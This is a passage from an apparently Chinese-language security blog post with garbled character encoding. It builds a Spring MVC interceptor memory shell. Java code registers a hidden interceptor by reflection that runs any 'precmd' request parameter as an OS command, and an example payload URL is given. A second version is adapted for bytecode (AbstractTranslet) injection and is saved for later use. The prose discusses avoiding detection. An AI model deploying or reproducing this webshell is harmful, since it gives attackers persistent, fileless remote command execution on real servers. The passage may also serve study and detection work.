</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bean</span><span class="p">.</span><span class="na">setInterceptors</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor_demo</span><span class="p">()});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">initApplicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;initApplicationContext&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Inject done&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">precmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;precmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">precmd</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;!</span><span class="n">precmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">precmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InputStreamReader</span><span class="w"> </span><span class="n">isr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">isr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">br</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;æ‰§è¡Œå‘½ä»¤æ—¶å‡ºç°å¼‚å¸¸: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;preprepreprepreprepre&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// è¿™é‡Œå¯ä»¥è¿›è¡Œæƒé™éªŒè¯ç­‰æ“ä½œï¼Œå¦‚æœéªŒè¯ä¸é€šè¿‡å¯ä»¥è¿”å› false ä¸­æ–­è¯·æ±‚å¤„ç†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    public Interceptor_demo(String a) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">postHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">mv</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;postpostpostpostpost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;afterafterafterafter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>pocè¿™é‡Œæ–¹ä¾¿å¤ç°ï¼Œç›´æ¥ç”¨çš„è·¯ç”±è¿™ç§æ–¹å¼ï¼Œç„¶åç”¨å­—èŠ‚ç åŠ è½½çš„è¯è¦æ”¹æˆ<code>è‡ªæ„æ–¹æ³•</code>å¹¶ä¸”æ·»åŠ ä¸€ä¸ª<code>æœ‰å‚è‡ªæ„æ–¹æ³•</code>ï¼Œå¹¶ä¸”<code>bean.setInterceptors(new Interceptor[]{new Interceptor_demo()});</code>è¿™é‡Œæ¢æˆ<code>æœ‰å‚è‡ªæ„æ–¹æ³•</code>ã€‚é¿å…ä¸€ç›´å¾ªç¯è°ƒç”¨<code>è‡ªæ„æ–¹æ³•</code>æ–¹æ³•äº†ï¼ˆè¿™é‡Œé€’å½’äº†ï¼‰</p>
<blockquote>
<p>ç„¶åè¿™é‡ŒInterceptorä¸­<code>preHandle()</code>æ„é€ å›æ˜¾æ²¡é—®é¢˜ï¼Œå…¶ä»–ä¸¤ä¸ªä¼šæœ‰é—®é¢˜ï¼Œå¯èƒ½æ˜¯å› ä¸ºåé¢ä¸¤ä¸ªæ–¹æ³•è°ƒç”¨åœ¨controllerï¼ˆè¿™é‡ŒæŒ‡<code>/hello</code>ï¼‰åé¢ï¼Œåœ¨controllerçš„æ—¶å€™å·²ç»è¿”å›å€¼çš„åŸå› .</p>
<p>ä½†æ˜¯ä¼š<code>preHandle()</code>åœ¨controller<strong>è°ƒç”¨å‰è°ƒç”¨</strong>å¹¶è¿”å›ç»“æœï¼Œä¼š<code>å½±å“controlleræ­£å¸¸åŠŸèƒ½</code>(è§ä¸‹å›¾)ï¼Œè¿™æ ·å®¹æ˜“è¢«å¯Ÿè§‰</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€‰ä¸€ä¸ªå…¶ä»–urlè·¯å¾„æ‰§è¡Œï¼Œwhyï¼Ÿä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å‘¢ï¼Œæˆ‘ä»¬pocä¸­åˆæ²¡æœ‰é…ç½®urlè·¯å¾„ï¼Ÿçœ‹åˆ°ä¸‹é¢<code>é—®é¢˜3</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">payload</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:8080/z?precmd=whoami</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20241125194512496.png" alt="image-20241125194512496"  />
</p>
<h3 id="é—®é¢˜3-urlè·¯å¾„">é—®é¢˜3 urlè·¯å¾„<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜3-urlè·¯å¾„">#</a></h3>
<p>æˆ‘ä»¬çŸ¥é“æ¯æ¬¡è®¿é—®æ˜¯ä»ä¸‹å›¾æ·»åŠ Interceptorçš„ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„<code>Interceptor_demo</code>ä¸ç»§æ‰¿<code>MappedInterceptor</code>ï¼Œä»¥è‡³äºä¼šä¸ä¼šè¿›è¡Œ</p>
<p><code>if (mappedInterceptor.matches(request)) {</code>çš„æ ¡éªŒï¼Œæ‰€ä»¥ä»»ä½•urlè·¯å¾„éƒ½ä¼šæ·»åŠ æˆ‘ä»¬çš„<code>Interceptor_demo </code>hhh</p>
<p><img loading="lazy" src="images/image-20241125195951000.png" alt="image-20241125195951000"  />
</p>
<h3 id="end-poc2">end poc2<a hidden class="anchor" aria-hidden="true" href="#end-poc2">#</a></h3>
<p>è¿˜æ˜¯è®°å½•ä¸‹æ¥å§ï¼Œæ–¹ä¾¿åé¢ç”¨ï¼ˆå­—èŠ‚ç çš„å½¢å¼ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.intercept.Interceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.lang.Nullable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Interceptor_demo</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="p">,</span><span class="n">Interceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bean</span><span class="p">.</span><span class="na">setInterceptors</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor_demo</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">initApplicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;initApplicationContext&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">precmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;precmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">precmd</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;!</span><span class="n">precmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">precmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InputStreamReader</span><span class="w"> </span><span class="n">isr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">isr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
